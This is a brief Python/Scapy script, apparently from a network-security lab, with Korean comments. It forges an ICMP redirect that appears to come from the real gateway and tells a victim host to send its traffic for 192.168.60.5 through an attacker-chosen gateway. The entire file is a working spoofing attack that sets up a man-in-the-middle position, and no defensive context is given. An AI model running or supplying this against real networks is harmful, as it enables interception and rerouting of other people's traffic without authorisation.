from scapy.all import *

victim = "10.9.0.5"
real_gateway = "10.9.0.11"
fake_gateway = "10.9.0.111"

# ICMP Redirect 패킷 구성
ip = IP(src=real_gateway, dst=victim)
icmp = ICMP(type=5, code=1, gw=fake_gateway)

# 원래 피해자가 보내려던 패킷 (destination: 192.168.60.5)
original_ip = IP(src=victim, dst="192.168.60.5")
original_payload = ICMP()

# 전체 패킷 조립 및 전송
packet = ip / icmp / original_ip / original_payload
send(packet)

